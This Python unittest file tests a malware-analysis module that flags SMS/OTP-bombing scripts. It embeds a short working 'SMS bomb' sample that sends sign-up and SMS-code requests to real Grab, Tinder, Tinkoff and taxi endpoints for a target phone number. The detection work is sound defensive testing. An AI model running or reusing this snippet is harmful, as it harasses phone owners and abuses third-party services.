import unittest

from app.modules.deep_analysis.behavior import interpret_behavior, extract_script_signals
from app.modules.deep_analysis.script_deep import analyze_script_deep
import tempfile
from pathlib import Path


SMS_BOMB_SNIPPET = '''
import requests
import threading
_phone = "79001234567"
requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={"phoneNumber": _phone})
requests.post("https://api.gotinder.com/v2/auth/sms/send", data={"phone_number": _phone})
requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": _phone})
requests.get("https://moscow.rutaxi.ru/ajax_keycode.html", params={"phone": _phone})
'''


class TestBehaviorInterpreter(unittest.TestCase):
    def test_detects_sms_otp_abuse(self):
        script = {
            'c2_urls': [
                'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                'https://api.gotinder.com/v2/auth/sms/send',
                'https://api.tinkoff.ru/v1/sign_up',
            ],
            'http_calls': [
                {'method': 'POST', 'url': 'https://p.grabtaxi.com/api/passenger/v2/profiles/register', 'purpose': 'auth/sms/otp'},
                {'method': 'POST', 'url': 'https://api.gotinder.com/v2/auth/sms/send', 'purpose': 'auth/sms/otp'},
            ],
            'language': 'python',
            'obfuscation_score': 0,
        }
        signals = extract_script_signals(SMS_BOMB_SNIPPET, script)
        self.assertTrue(signals['has_phone_fields'])
        self.assertGreaterEqual(len(signals['auth_sms_urls']), 2)

        bundle = {
            'combined_verdict': 'needs_review',
            'deep_exclusive': {'script': script},
        }
        behavior = interpret_behavior(bundle, sample_text=SMS_BOMB_SNIPPET)
        self.assertEqual(behavior['behavior_class'], 'sms_otp_abuse')
        self.assertEqual(behavior['threat_category'], 'abuse_tool')
        self.assertIn('SMS', behavior['summary'])
        self.assertIn('not traditional C2', behavior['summary'])
        self.assertTrue(behavior['notable_services'])

    def test_script_deep_extracts_http_calls(self):
        with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False) as f:
            f.write(SMS_BOMB_SNIPPET)
            path = Path(f.name)
        try:
            result = analyze_script_deep(path, filename='sms.py')
            self.assertGreaterEqual(len(result['http_calls']), 3)
            self.assertGreaterEqual(result['auth_sms_url_count'], 2)
            self.assertNotIn('requests.post', result['c2_domains'])
        finally:
            path.unlink(missing_ok=True)


if __name__ == '__main__':
    unittest.main()
